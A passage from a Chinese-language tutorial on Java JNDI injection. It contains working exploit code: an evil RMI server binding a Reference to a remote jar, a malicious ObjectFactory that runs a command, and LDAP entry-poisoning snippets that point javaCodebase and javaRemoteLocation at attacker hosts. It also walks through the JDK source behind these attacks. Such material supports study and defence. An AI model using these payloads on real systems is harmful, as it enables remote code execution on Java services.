使用ctx可以查询或存储数据,此处省去业务代码\n \n        ctx.close();\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n}\nJNDI 示例 DataSource\nJNDI 连接数据库（JDBC）比较特殊，Java 目前不提供内置的实现方法，提供数据源服务的多是 Servlet 容器，这里我们以 Tomcat 为例学习如何在应用服务中使用 JNDI 查找容器提供的数据源。\nTomcat 配置 JNDI 数据源需要手动修改 Tomcat 目录 /conf/context.xml 文件，参考：Tomcat JNDI Datasource，这里我们在 Tomcat 的 conf/context.xml 中添加如下配置：\n&lt;Resource name=&quot;jdbc/test&quot; auth=&quot;Container&quot; type=&quot;javax.sql.DataSource&quot;\n               maxTotal=&quot;100&quot; maxIdle=&quot;30&quot; maxWaitMillis=&quot;10000&quot;\n               username=&quot;root&quot; password=&quot;root&quot; driverClassName=&quot;com.mysql.jdbc.Driver&quot;\n               url=&quot;jdbc:mysql://localhost:3306/mysql&quot;/&gt;\n然后我们需要下载好 Mysql 的 JDBC 驱动包 并复制到 Tomcat 的 lib 目录，配置好数据源之后我们重启 Tomcat 服务就可以使用 JNDI 的方式获取 DataSource 了。\n&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;\n&lt;%@ page import=&quot;javax.naming.Context&quot; %&gt;\n&lt;%@ page import=&quot;javax.naming.InitialContext&quot; %&gt;\n&lt;%@ page import=&quot;javax.sql.DataSource&quot; %&gt;\n&lt;%@ page import=&quot;java.sql.Connection&quot; %&gt;\n&lt;%@ page import=&quot;java.sql.ResultSet&quot; %&gt;\n&lt;%\n    // 初始化JNDIContext\n    Context context = new InitialContext();\n \n    // 搜索Tomcat注册的JNDI数据库连接池对象\n    DataSource dataSource = (DataSource) context.lookup(&quot;java:comp/env/jdbc/test&quot;);\n \n    // 获取数据库连接\n    Connection connection = dataSource.getConnection();\n \n    // 查询SQL语句并返回结果\n    ResultSet rs = connection.prepareStatement(&quot;select version()&quot;).executeQuery();\n \n    // 获取数据库查询结果\n    while (rs.next()) {\n        out.println(rs.getObject(1));\n    }\n \n    rs.close();\n%&gt;\n访问 tomcat-datasource-lookup.jsp 输出: 5.7.28。\n\n需要注意的是示例 jsp 代码中的 Demo 使用了系统的环境变量所以并不需要在创建 context 的时候传入环境变量对象。Tomcat 在启动的时候会设置 JNDI 变量信息，处理 JNDI 服务的类是 org.apache.naming.java.javaURLContextFactory，所以在 jsp 中可以直接创建 context。\n\nJNDI 协议转换\n如果 JNDI 在 lookup 时没有指定初始化工厂名称，会自动根据协议类型动态查找内置的工厂类然后创建处理对应的服务请求。\nJNDI 默认支持自动转换的协议有：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n协议名称协议 URLContext 工厂类DNSdns://com.sun.jndi.url.dns.dnsURLContextFactoryRMIrmi://com.sun.jndi.rmi.registry.RegistryContextFactoryLDAPldap://com.sun.jndi.ldap.LdapCtxFactoryLDAPldaps://com.sun.jndi.url.ldaps.ldapsURLContextFactoryIIOPiiop://com.sun.jndi.url.iiop.iiopURLContextIIOPiiopname://com.sun.jndi.url.iiopname.iiopnameURLContextFactoryIIOPcorbaname://com.sun.jndi.url.corbaname.corbanameURLContextFactory\nRMI/LDAP 远程对象引用安全限制\n在 RMI 服务中引用远程对象将受本地 Java 环境限制，即本地的 java.rmi.server.useCodebaseOnly 配置必须为 false(允许加载远程对象)，如果该属性设置为 true 则禁止引用远程对象。\n除此之外在 LDAP 服务下被引用的 ObjectFactory 对象还将受到 com.sun.jndi.rmi.object.trustURLCodebase 配置限制，如果该属性为 false(不信任远程引用对象) 一样无法调用远程的引用对象。具体见下表\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nProviderProperty to enable remote class loadingSecurity Manager enforcementRMIjava.rmi.server.useCodebaseOnly = false（从 JDK 5u45, JDK 6u45,JDK 7u21,JDK 8u121 开始，默认值=true）；com.sun.jndi.rmi.object.trustURLCodebase = true （JDK 6u132, JDK 7u122, JDK 8u113 开始，默认值=false）AlwaysLDAPcom.sun.jndi.rmi.object.trustURLCodebase = true（从 JDK 11.0.1、8u191、7u201、6u211 开始，默认值=false）Not enforcedCORBAAlways\n但是在 Naming Manager 这一层，安全策略的限制很宽松，在对 JNDI 的 Reference 对象（见 JNDI-Reference）进行解析时通常没什么防护措施，导致可以远程加载类。\n本地测试远程对象引用可以使用如下方式允许加载远程的引用对象：\nSystem.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;);\nSystem.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);\n或使用 -Djava.rmi.server.useCodebaseOnly=false-Dcom.sun.jndi.rmi.object.trustURLCodebase=true 作为 JVM 启动参数。\n高版本 JDK 等绕过可以借助目标本地环境的工厂类，可以参考文章 3。\nJNDI 注入\nJNDI 注入点位于 Context 的各个方法中：\n\n由 InitialContext 及其子类，如 InitialDirContext 和 InitialLdapContext 创建的 Context 对象会受影响。\n\n属性覆盖\n通常创建 Context 对象时会为其指定一些属性，但在某些方法中，如 lookup，可以被传递的参数修改。\n例如下面的代码：\nProperties properties = new Properties();\nproperties.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);\n// properties.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);\n \nContext context = new InitialContext(properties);\n// Context.INITIAL_CONTEXT_FACTORY被覆盖了\ncontext.lookup(&quot;ldap://attacker-server/cn=bar,dc=test,dc=org&quot;);\n原因是 InitialContext 的 lookup 方法会调用 getURLOrDefaultInitCtx 方法，获取可用的 Context 对象，从而导致最后创建的是 ldapURLContext\nprotected Context getURLOrDefaultInitCtx(String name)\nthrows NamingException {\n    if (NamingManager.hasInitialContextFactoryBuilder()) {\n        return getDefaultInitCtx();\n    }\n    String scheme = getURLScheme(name);\n    if (scheme != null) {\n        Context ctx = NamingManager.getURLContext(scheme, myProps);\n        if (ctx != null) {\n        return ctx;\n        }\n    }\n    return getDefaultInitCtx();\n}\nCommunicationException\n在尝试运行上述代码时，你可能会遇到异常 javax.naming.CommunicationException，并认为 lookup 的参数并没有覆盖成功。\n\n其实不然，这是因为单纯的指定 Context.INITIAL_CONTEXT_FACTORY，在调用 InitialContext 时他会尝试连接一个默认地址，例如对于 ldap，该地址为 localhost:389。只需指定 Context.PROVIDER_URL 属性即可发现是可以覆盖成功的。\nJNDI-Reference\n在 JNDI 服务中允许使用系统以外的对象，比如在某些目录服务中直接引用远程的 Java 对象，但遵循一些安全限制，如前所述『RMI/LDAP 远程对象引用安全限制 (Remote Codebases and Security Managers)』。\nJNDI-RMI\n下面演示使用 RMI 作为攻击向量。前面介绍了 Refernece 对象，以及它可以根据工厂类来创建对象。该工厂类是一个实现了 ObjectFactory 接口的对象。下面是一个简单的 payload，创建了一个恶意的 RMI 服务，并把恶意的 Reference 对象绑定至 Registry，\n// Create JNDI Reference using remote factory class\nReference reference = new Reference(&quot;myClassName&quot;,&quot;factoryClassName&quot;,FactoryURL);\nReferenceWrapper wrapper = new ReferenceWrapper(reference);\n// Bind the object to the RMI Registry\nctx.bind(&quot;Foo&quot;, wrapper);\n考虑 Context.lookup 方法参数可控，传入恶意 URL，会调用到 RegistryContext.decodeObject() 方法，并调用 NamingManager.getObjectInstance() 方法实例化工厂类并调用工厂类的 getObjectInstance 方法 [1]，返回恶意对象。如下\nprivate Object decodeObject(Remote r, Name name) throws NamingException {\n\ttry {\n\t\tObject obj = (r instanceof RemoteReference)\n\t\t\t\t\t? ((RemoteReference)r).getReference()\n\t\t\t\t\t: (Object)r;\n \n\t\t/*\n\t\t * Classes may only be loaded from an arbitrary URL codebase when\n\t\t * the system property com.sun.jndi.rmi.object.trustURLCodebase\n\t\t * has been set to &quot;true&quot;.\n\t\t */\n \n\t\t// Use reference if possible\n\t\tReference ref = null;\n\t\tif (obj instanceof Reference) {\n\t\t\tref = (Reference) obj;\n\t\t} else if (obj instanceof Referenceable) {\n\t\t\tref = ((Referenceable)(obj)).getReference();\n\t\t}\n \n\t\tif (ref != null &amp;&amp; ref.getFactoryClassLocation() != null &amp;&amp;\n\t\t\t!trustURLCodebase) {\n\t\t\tthrow new ConfigurationException(\n\t\t\t\t&quot;The object factory is untrusted. Set the system property&quot; +\n\t\t\t\t&quot; &#039;com.sun.jndi.rmi.object.trustURLCodebase&#039; to &#039;true&#039;.&quot;);\n\t\t}\n\t\treturn NamingManager.getObjectInstance(obj, name, this,\n\t\t\t\t\t\t\t\t\t\t\t   environment); // [1]\n\t} catch (NamingException e) {\n\t\tthrow e;\n\t} catch (RemoteException e) {\n\t\tthrow (NamingException)\n\t\t\twrapRemoteException(e).fillInStackTrace();\n\t} catch (Exception e) {\n\t\tNamingException ne = new NamingException();\n\t\tne.setRootCause(e);\n\t\tthrow ne;\n\t}\n}\nNamingManager.getObjectInstance 中会调用的 getObjectFactoryFromReference 方法 [2]\npublic static Object\ngetObjectInstance(Object refInfo, Name name, Context nameCtx,\n                  Hashtable&lt;?,?&gt; environment)\nthrows Exception\n{\n \n    ObjectFactory factory;\n \n\t// ...\n\t// Use reference if possible\n\tReference ref = null;\n\tif (refInfo instanceof Reference) {\n\t\tref = (Reference) refInfo;\n\t} else if (refInfo instanceof Referenceable) {\n\t\tref = ((Referenceable)(refInfo)).getReference();\n\t}\n \n\tObject answer;\n \n\tif (ref != null) {\n\t\tString f = ref.getFactoryClassName();\n\t\tif (f != null) {\n\t\t\t// if reference identifies a factory, use exclusively\n \n\t\t\tfactory = getObjectFactoryFromReference(ref, f); // [2]\n\t\t\tif (factory != null) {\n\t\t\t\treturn factory.getObjectInstance(ref, name, nameCtx,\n\t\t\t\t\t\t\t\t\t\t\t\t environment);\n而 getObjectFactoryFromReference 方法会从指定的 codebase 中实例化工厂类 [3]\nstatic ObjectFactory getObjectFactoryFromReference(\n\tReference ref, String factoryName)\n\tthrows IllegalAccessException,\n\tInstantiationException,\n\tMalformedURLException {\n\tClass&lt;?&gt; clas = null;\n \n\t// Try to use current class loader\n\ttry {\n\t\t clas = helper.loadClass(factoryName);\n\t} catch (ClassNotFoundException e) {\n\t\t// ignore and continue\n\t\t// e.printStackTrace();\n\t}\n\t// All other exceptions are passed up.\n \n\t// Not in class path; try to use codebase\n\tString codebase;\n\tif (clas == null &amp;&amp;\n\t\t\t(codebase = ref.getFactoryClassLocation()) != null) {\n\t\ttry {\n\t\t\tclas = helper.loadClass(factoryName, codebase); // [3]\n\t\t} catch (ClassNotFoundException e) {\n\t\t}\n\t}\n \n\treturn (clas != null) ? (ObjectFactory) clas.newInstance() : null;\n}\n如果攻击者实现一个恶意的工厂类『实现 javax.naming.spi.ObjectFactory 接口』，就可以对目标发起攻击。在上述代码能够看到对 clas.newInstance(f) 的调用，所以实际利用时，恶意类没必要实现 javax.naming.spi.ObjectFactory 接口，只需将待执行的代码放在 static 代码块中即可。\nObjectFactoriesFilter\n高版本 JDK 中，在 [3] 后增加了对 codebase 中获取的 ObjectFactory 进行检查 [4]\nString codebase;\nif (clas == null &amp;&amp;\n\t\t(codebase = ref.getFactoryClassLocation()) != null) {\n\ttry {\n\t\tclas = helper.loadClass(factoryName, codebase);\n\t\t// Validate factory&#039;s class with the objects factory serial filter\n\t\tif (clas == null ||\n\t\t\t!ObjectFactoriesFilter.canInstantiateObjectsFactory(clas)) { // [4]\n\t\t\treturn null;\n\t\t}\n\t} catch (ClassNotFoundException e) {\n\t}\n}\n它的默认检查项并不会限制利用，但是受害者如果必须使用 codebase，可通过实现自定义 filter，并将它添加至 ObjectFactoriesFilter.GLOBAL.filters 成员中，每一个 filter 的参数是前面获取的类的 Class 对象。\n恶意的 ObjectFactory 对象\nReference 所用的对象工厂必须实现 javax.naming.spi.ObjectFactory 接口并实现 getObjectInstance 方法。\npublic class ReferenceObjectFactory implements ObjectFactory {\n \n    /**\n     * @param obj  包含可在创建对象时使用的位置或引用信息的对象（可能为 null）。\n     * @param name 此对象相对于 ctx 的名称，如果没有指定名称，则该参数为 null。\n     * @param ctx  一个上下文，name 参数是相对于该上下文指定的，如果 name 相对于默认初始上下文，则该参数为 null。\n     * @param env  创建对象时使用的环境（可能为 null）。\n     * @return 对象工厂创建出的对象\n     * @throws Exception 对象创建异常\n     */\n    public Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable&lt;?, ?&gt; env) throws Exception {\n        // 在创建对象过程中插入恶意的攻击代码，或者直接创建一个本地命令执行的Process对象从而实现RCE\n        return Runtime.getRuntime().exec(&quot;wget localhost:9000&quot;);\n    }\n \n}\n创建恶意的 RMI 服务\n如果在 RMI 服务端绑定一个恶意的引用对象，RMI 客户端在获取服务端绑定的对象时发现是一个 Reference 对象后检查当前 JVM 是否允许加载远程引用对象，如果允许加载且本地不存在此对象工厂类则使用 URLClassLoader 加载远程的 jar，并加载我们构建的恶意对象工厂 (EvilObjectFactory) 类然后调用其中的 getObjectInstance 方法从而触发该方法中的恶意 RCE 代码。\npublic class EvilRMIServer {\n    public static void main(String[] args) {\n        try {\n            Registry reg = LocateRegistry.createRegistry(1099);\n            // 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类\n            String url = &quot;http://localhost:8081/jndi-1.0.jar&quot;;\n \n\t\t\t// 目的是调用工厂类的getObjectInstance，所以第一个参数其实可以随意写\n            Reference reference = new Reference(&quot;com.trganda.factory.EvilObjectFactory&quot;, &quot;com.trganda.factory.EvilObjectFactory&quot;, url);\n            ReferenceWrapper wrapper = new ReferenceWrapper(reference);\n \n            reg.bind(&quot;foo&quot;, wrapper);\n \n            System.out.println(&quot;Listening...&quot;);\n        } catch (Exception ex) {\n            ex.printStackTrace();\n        }\n    }\n}\n启动完成后会在本地监听 9000 端口测试客户端调用 RMI 方法后是否执行了 curl localhost:9000 命令。使用 nc-vv-l 9000 进行监听。\n客户端代码\npublic static void main(String[] args) {\n    try {\n        // 测试时如果需要允许调用RMI远程引用对象加载请取消如下注释\n        System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;);\n        System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);\n \n        InitialContext context = new InitialContext();\n \n        // 获取RMI绑定的恶意ReferenceWrapper对象\n        Object obj = context.lookup(RMI_NAME);\n \n        System.out.println(obj);\n    } catch (NamingException e) {\n        e.printStackTrace();\n    }\n}\n运行后得到如下回显\nGET / HTTP/1.1\nHost: localhost:9000\nUser-Agent: Wget/1.21.3\nAccept: */*\nAccept-Encoding: identity\nConnection: Keep-Alive\n整个攻击过程总结如下：\n\nlookup 方法参数可控，攻击者提供恶意的 URL 路径。\n受害者连接至攻击者控制的 RMI Registry 获取 JNDI Reference。\n受害者对 Reference 进行解码，获取工厂类信息。\n从 Reference 中指定的目标地址获取工厂类。\n实例化工厂类。\n执行 pyaload。\n\n\n除了 InitialContext.lookup 方法外，其它会间接调用 lookup 的方法都是可被攻击的目标。如 InitialContext.rename() 和  InitialContext.lookupLink()\nRMI-Codebase\n另一种利用方式是使用 RMI 的 codebase 进行远程加载，不过利用条件苛刻。有以下条件限制\n\nRMI 客户端需要设置一个 Security Manager，并且允许访问远程的 codebase。\njava.rmi.server.useCodebaseOnly=false\n\n通过反序列化漏洞利用 JNDI\n相关入口见 JNDI 注入 章节。\nJNDI-CORBA\nJNDI-LDAP\nJNDI 也支持 LDAP 服务，它和 RMI 不同的地方是它是一个目录服务，可以通过（目录）的属性来存储对象的信息。而在 LDAP 服务中，有两种方式存储 Java 对象，\n\n序列化方式\n\ndocs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html\n\n\nJNDI Reference 方式\n\ndocs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html\n\n\n\n可以通过 DirContext.lookup() 和 LDAP Entry 投毒的方式进行利用，前者的攻击方式和 JNDI-RMI 的原理是类似的，攻击者构造一个恶意 LDAP 服务；后者则可以对目标自身使用的 LDAP 服务进行投毒，并等待受害者获取该 Entry。\n相关的危险方法有，InitialDirContext.lookup()，Spring 中的 LdapTemplate.lookup() 和 LdapTemplate.lookupContext()。\nJNDI Entry 投毒\n\nInitialContext.lookup 在企业应用中的使用是比较少的，更多操作是在 LDAP 的 Attribute 上，而不是直接操作对象。\n\n例如，目标服务可能不会使用 lookup 从 ldap 服务上查找获取对象，而更多的是使用 search 方法获取 ldap entry 的 attribute，如用户名，密码和邮箱等。这种情况下没有 Java 对象的反序列化，但是 search 方法中有一个特别的标志，returnObjFlag。\n如果在使用 search 方法时带有 returnObjFlag=true 标志，在返回的 SearchResult 中会绑定对应的 Java 对象，这意味着如果攻击者能够控制 ldap 的响应内容就可以在目标上执行恶意代码。\n相关代码位于 LdapSearchEnumeration#createItem，如果没有设置 returnObjFlag 标志则尝试返回一个 DirContext 实例\nprotected SearchResult createItem(String var1, final Attributes var2, Vector&lt;Control&gt; var3) throws NamingException {\n\tObject var4 = null;\n\tboolean var7 = true;\n \n\t// ...\n \n\tthis.homeCtx.setParents(var2, var9);\n\t// returnObjFlag 为 true\n\tif (this.searchArgs.cons.getReturningObjFlag()) {\n\t\tif (var2.get(Obj.JAVA_ATTRIBUTES[2]) != null) {\n\t\t\ttry {\n\t\t\t\tvar4 = AccessController.doPrivileged(new PrivilegedExceptionAction&lt;Object&gt;() {\n\t\t\t\t\tpublic Object run() throws NamingException {\n\t\t\t\t\t\t// 远程加载对象并进行反序列化\n\t\t\t\t\t\treturn Obj.decodeObject(var2); // [4]\n\t\t\t\t\t}\n\t\t\t\t}, this.acc);\n\t\t\t} catch (PrivilegedActionException var15) {\n\t\t\t\tthrow (NamingException)var15.getException();\n\t\t\t}\n\t\t}\n其中调用 Obj#decodeObject 从 attribute 中获取对象 [4]\nstatic Object decodeObject(Attributes var0) throws NamingException {\n\tString[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));\n \n\ttry {\n\t\tAttribute var1;\n\t\tif ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {\n\t\t\tClassLoader var3 = helper.getURLClassLoader(var2);\n\t\t\treturn deserializeObject((byte[])((byte[])var1.get()), var3);\n\t\t} else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {\n\t\t\treturn decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);\n\t\t} else {\n\t\t\tvar1 = var0.get(JAVA_ATTRIBUTES[0]);\n\t\t\treturn var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) &amp;&amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);\n\t\t}\n\t} catch (IOException var5) {\n\t\tNamingException var4 = new NamingException();\n\t\tvar4.setRootCause(var5);\n\t\tthrow var4;\n\t}\n}\nJava 对象在 LDAP 服务中的存储形式\n参考 RFC 2713：\n\nSerialized Objects：Java 对象序列化数据，具有如下属性\n\nobjectClass：固定值，javaSerializedObject\njavaClassName: 序列化对象的类名\njavaClassNames：有关 javaClassName 所指对象的其它类信息，可以和 javaClassName 相同，也可以指名它实现的接口或父类，祖先类等。\njavaCodebase：Codebase\njavaSerializedData：序列化数据，如果不为空且反序列化成功就不使用 Codebase 进行远程加载\n\n\nJNDI References：具有如下属性，用于构建 javax.naming.Reference 对象\n\nobjectClass：固定值，javaNamingReference\njavaClassName：被引用对象的类名\njavaClassNames：有关 javaClassName 所指对象的其它类信息，可以和 javaClassName 相同，也可以指名它实现的接口或父类，祖先类等。\njavaCodebase：Codebase\njavaReferenceAddress：描述 Reference 对象的属性，可以指定多个，类型为字符串数组\njavaFactory：可选，工厂类名『用于创建 javaClassName 所指对象』\n\n\nMarshalled Objects：与 Serialized Objects 类似，但不会记录 codebase\n\nobjectClass：固定值，javaMarshalledObject\njavaClassName：序列化对象的类名\njavaClassNames：有关 javaClassName 所指对象的其它类信息，可以和 javaClassName 相同，也可以指名它实现的接口或父类，祖先类等。\njavaSerializedData: 序列化数据，如果不为空且反序列化成功就不使用 Codebase 进行远程加载\n\n\nRemote Location (deprecated)：用来存储 RMI Remote 对象，现在可通过 JNDI References 或 Marshalled Objects 替代\n\njavaRemoteLocation：远程对象的 URL，可使用 rmi ldap、ldaps、dns、iiop、iiopname、cobarname 等协议。\njavaClassName：远程对象的类名\n\n\n\n上面的 4 种存储形式也意味着有多种利用方式。\n反序列化\nSerialized Objects 和 Marshalled Objects 形式的 LDAP Entry。序列化数据存储在 javaSerializedData 中，反序列化过程发生在 com.sun.jndi.ldap.Obj.decodeObject(Attributes attrs) 方法中，\n\n受 com.sun.jndi.ldap.object.trustSerialData 属性影响，默认为 true。\n\nstatic Object decodeObject(Attributes attrs)\n    throws NamingException {\n \n    Attribute attr;\n \n    // Get codebase, which is used in all 3 cases.\n    String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE]));\n    try {\n        if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) {\n            // com.sun.jndi.ldap.object.trustSerialData 属性是否 true\n            if (!VersionHelper12.isSerialDataAllowed()) {\n                throw new NamingException(&quot;Object deserialization is not allowed&quot;);\n            }\n            ClassLoader cl = helper.getURLClassLoader(codebases);\n            // 触发反序列化\n            return deserializeObject((byte[])attr.get(), cl);\n        // more code...\n}\n那么借助 javaSerializedData 属性可以直接利用反序列化漏洞。\n而 javaCodebase 属性则可用于控制 codebase。但就像前面说的，这种方式容易受到 JVM 和安全策略的限制。这种情况下，可以考虑利用目标 classpath 中已有的类进行攻击。\n那么可以构造的一个恶意的 Entry 放入 LDAP 服务器中，如下：\nSystem.out.println(&quot;Poisoning LDAP user&quot;);\n// 使用 docs.oracle.com/javase/jndi/tutorial/config/LDAP/java.schema 文件配置 ldap 服务器时，无法设置 javaCodebase 属性\nBasicAttribute mod1 = new\nBasicAttribute(&quot;javaCodebase&quot;,attackerURL));\nBasicAttribute mod2 = new\nBasicAttribute(&quot;javaClassName&quot;,&quot;DeserPayload&quot;));\nBasicAttribute mod3 = new BasicAttribute(&quot;javaSerializedData&quot;,\nserializedBytes));\nModificationItem[] mods = new ModificationItem[3];\nmods[0] = new ModificationItem(DirContext.ADD_ATTRIBUTE, mod1);\nmods[1] = new ModificationItem(DirContext.ADD_ATTRIBUTE, mod2);\nmods[2] = new ModificationItem(DirContext.ADD_ATTRIBUTE, mod3);\nctx.modifyAttributes(&quot;uid=target,ou=People,dc=example,dc=com&quot;, mods);\n利用 References\n回到更易利用的 JNDI Reference，利用方式和之前类似，就像前面说的，它相对来讲使用更广泛，而且限制条件少。 Naming Manager 会检查 javaFactory 和 javaCodebase 属性，并从指定地址获取类后进行实例化。 相关代码也在 com.sun.jndi.ldap.Obj.decodeObject(Attributes attrs) 中\nstatic Object decodeObject(Attributes attrs)\n    throws NamingException {\n \n    Attribute attr;\n \n    // Get codebase, which is used in all 3 cases.\n    String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE]));\n    try {\n    \t\t// more code...\n            attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);\n            if (attr != null &amp;&amp;\n                (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) ||\n                    attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) {\n                // 获取 Reference\n                return decodeReference(attrs, codebases);\n            }\n            // more code...\n}\n并在 decodeReference(Attributes attrs, String[] codebases) 方法中创建并返回 Reference 对象\nprivate static Reference decodeReference(Attributes attrs,\n    String[] codebases) throws NamingException, IOException {\n \n    Attribute attr;\n    String className;\n    String factory = null;\n \n    if ((attr = attrs.get(JAVA_ATTRIBUTES[CLASSNAME])) != null) {\n        className = (String)attr.get();\n    } else {\n        throw new InvalidAttributesException(JAVA_ATTRIBUTES[CLASSNAME] +\n                    &quot; attribute is required&quot;);\n    }\n \n    if ((attr = attrs.get(JAVA_ATTRIBUTES[FACTORY])) != null) {\n        factory = (String)attr.get();\n    }\n \n    Reference ref = new Reference(className, factory,\n        (codebases != null? codebases[0] : null));\n\t// more code...\n}\n获取 Reference 对象后，返回 com.sun.jndi.ldap.LdapCtx#c_lookup 并最终在方法 DirectoryManager#getObjectInstance 中根据 Reference 获取指定的工厂类\n\nLDAP 被方法与 RMI 不同，但逻辑相差不多。\n\npublic static Object\n\tgetObjectInstance(Object refInfo, Name name, Context nameCtx,\n\t\t\t\t\t  Hashtable&lt;?,?&gt; environment, Attributes attrs)\n\tthrows Exception {\n\tif (ref != null) {\n\t\tString f = ref.getFactoryClassName();\n\t\tif (f != null) {\n\t\t\t// if reference identifies a factory, use exclusively\n \n\t\t\tfactory = getObjectFactoryFromReference(ref, f);\n\t\t\tif (factory instanceof DirObjectFactory) {\n\t\t\t\treturn ((DirObjectFactory)factory).getObjectInstance(\n\t\t\t\t\tref, name, nameCtx, environment, attrs);\n\t\t\t} else if (factory != null) {\n\t\t\t\t// 调用 getObjectInstance 方法\n\t\t\t\treturn factory.getObjectInstance(ref, name, nameCtx,\n\t\t\t\t\t\t\t\t\t\t\t\t environment);\n\t\t\t}\n\t\t\t// No factory found, so return original refInfo.\n\t\t\t// Will reach this point if factory class is not in\n\t\t\t// class path and reference does not contain a URL for it\n\t\t\treturn refInfo;\n \n\t\t} else {\n\t\t\t// if reference has no factory, check for addresses\n\t\t\t// containing URLs\n\t\t\t// ignore name &amp; attrs params; not used in URL factory\n \n\t\t\tanswer = processURLAddrs(ref, name, nameCtx, environment);\n\t\t\tif (answer != null) {\n\t\t\t\treturn answer;\n\t\t\t}\n\t\t}\n\t}\njavaReferenceAddress\n同时需要注意一点，如果 javaReferenceAddress 属性存在，它也会被反序列化 _。\n\nbinary 格式下的 javaReferenceAddress 编码形式为 #2#TypeC##rO0ABXNyABpq...，# 为分隔符，第一个分隔符后的数字为 RefAddr 的序号『因为可能有多个』，第二个分隔符后为 RefAddr 的类型，第三个分隔符后为 RefAddr 的内容。具体逻辑可以参考 RFC 文档或是 JDK 代码。该属性能否进行反序列化，受 com.sun.jndi.ldap.object.trustSerialData 系统属性影响。\n\nprivate static Reference decodeReference(Attributes attrs,\n    String[] codebases) throws NamingException, IOException {\n \n    Reference ref = new Reference(className, factory,\n        (codebases != null? codebases[0] : null));\n \n    if ((attr = attrs.get(JAVA_ATTRIBUTES[REF_ADDR])) != null) {\n        // more code ...\n\t\t// 判断是否允许对 binary 格式的 javaReferenceAddress 进行反序列化\n\t\tif (!VersionHelper.isSerialDataAllowed()) {\n\t\t\tthrow new NamingException(&quot;Object deserialization is not allowed&quot;);\n\t\t}\n\t\tif (decoder == null)\n            decoder = Base64.getMimeDecoder();\n        // 获取第 3 个字符开始后的内容，base64 解码后进行反序列化。\n        RefAddr ra = (RefAddr)\n            deserializeObject(\n                decoder.decodeBuffer(val.substring(start)),\n                cl);\n}\n由此可以构造下面这样恶意的 Entry：\nSystem.out.println(&quot;Poisoning LDAP user&quot;);\nAttribute mod1 = new BasicAttribute(&quot;objectClass&quot;, &quot;top&quot;);\nmod1.add(&quot;javaNamingReference&quot;);\nAttribute mod2 = new BasicAttribute(&quot;javaCodebase&quot;, &quot;http://attackerURL/&quot;);\nAttribute mod3 = new BasicAttribute(&quot;javaClassName&quot;, &quot;PayloadObject&quot;);\nAttribute mod4 = new BasicAttribute(&quot;javaFactory&quot;, &quot;PayloadObject&quot;);\nModificationItem[] mods = new ModificationItem[] {\n    new ModificationItem(DirContext.ADD_ATTRIBUTE, mod1),\n    new ModificationItem(DirContext.ADD_ATTRIBUTE, mod2),\n    new ModificationItem(DirContext.ADD_ATTRIBUTE, mod3),\n    new ModificationItem(DirContext.ADD_ATTRIBUTE, mod4)\n};\nctx.modifyAttributes(&quot;uid=target,ou=People,dc=example,dc=com&quot;, mods);\nRemote Location\n虽然在 RFC 中被视为废弃，但并不代表无法使用，JDK 代码中尚有它的影子。如果 javaRemoteLocation 属性存在，那么它会被解码，攻击者可以构造一个 Reference 对象，存放在 RMI 的 Registry 中，并将 javaRemoteLocation 指向它。com.sun.jndi.ldap.Obj.decodeObject(Attributes attrs):\nif ((attr = attrs.get(JAVA_ATTRIBUTES[REMOTE_LOC])) != null) {\n    // For backward compatibility only\n    // 可以看到为了向后兼容，保留了该属性\n    return decodeRmiObject(\n         (String)attrs.get(JAVA_ATTRIBUTES[CLASSNAME]).get(),\n         (String)attr.get(), codebases);\n}\ndecodeRmiObject 内容如下，会返回一个 Reference 对象，这样又变回为前面提到的利用方式了\nprivate static Object decodeRmiObject(String className,\n    String rmiName, String[] codebases) throws NamingException {\n        return new Reference(className, new StringRefAddr(&quot;URL&quot;, rmiName));\n}\n如果 LDAP 服务器或者 LDAP 响应是攻击者可控的，即使这个属性已经废弃，它依然可以被利用\nSystem.out.println(&quot;Poisoning LDAP user&quot;);\nBasicAttribute mod1 = new BasicAttribute(&quot;javaRemoteLocation&quot;,\n&quot;rmi://attackerURL/PayloadObject&quot;);\nBasicAttribute mod2 = new BasicAttribute(&quot;javaClassName&quot;,\n&quot;PayloadObject&quot;);\nModificationItem[] mods = new ModificationItem[2];\nmods[0] = new ModificationItem(DirContext.ADD_ATTRIBUTE, mod1);\nmods[1] = new ModificationItem(DirContext.ADD_ATTRIBUTE, mod2);\nctx.modifyAttributes(&quot;uid=target,ou=People,dc=example,dc=com&quot;, mods);\n顺带一提的是，javaRemoteLocation 除了可以指定为使用 rmi 协议外，还可以使用其它协议，例如 ldap、ldaps、dns、iiop、iiopname、cobarname 等。具体取决于当前运行环境中是否有对应的依赖。\nprivate static Object getURLObject(String scheme, Object 